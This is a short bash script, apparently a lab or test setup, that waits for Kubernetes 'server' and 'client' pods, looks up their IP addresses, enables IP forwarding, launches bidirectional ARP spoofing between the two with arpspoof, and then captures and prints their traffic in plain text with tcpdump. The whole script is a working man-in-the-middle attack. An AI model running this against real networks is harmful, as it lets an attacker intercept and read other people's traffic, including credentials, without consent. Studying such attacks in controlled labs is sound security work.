#!/bin/bash
set -e

echo "Waiting for deployments to roll out..."
kubectl rollout status deployment/server --timeout=300s
kubectl rollout status deployment/client --timeout=300s

echo "Waiting for server pod IP..."
until SERVER_IP=$(kubectl get pods -l app=server -o jsonpath='{.items[0].status.podIP}' 2>/dev/null) && [ -n "$SERVER_IP" ]; do
    sleep 2
done

echo "Waiting for client pod IP..."
until CLIENT_IP=$(kubectl get pods -l app=client -o jsonpath='{.items[0].status.podIP}' 2>/dev/null) && [ -n "$CLIENT_IP" ]; do
    sleep 2
done

IFACE=$(ip route | grep default | awk '{print $5}')

echo "Server IP: $SERVER_IP"
echo "Client IP: $CLIENT_IP"
echo "Interface: $IFACE"

echo "Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "Starting bidirectional ARP spoofing between client and server..."
arpspoof -i "$IFACE" -r -t "$CLIENT_IP" "$SERVER_IP" &

sleep 5

echo "Starting packet capture..."
exec tcpdump -l -nne -A -i "$IFACE"
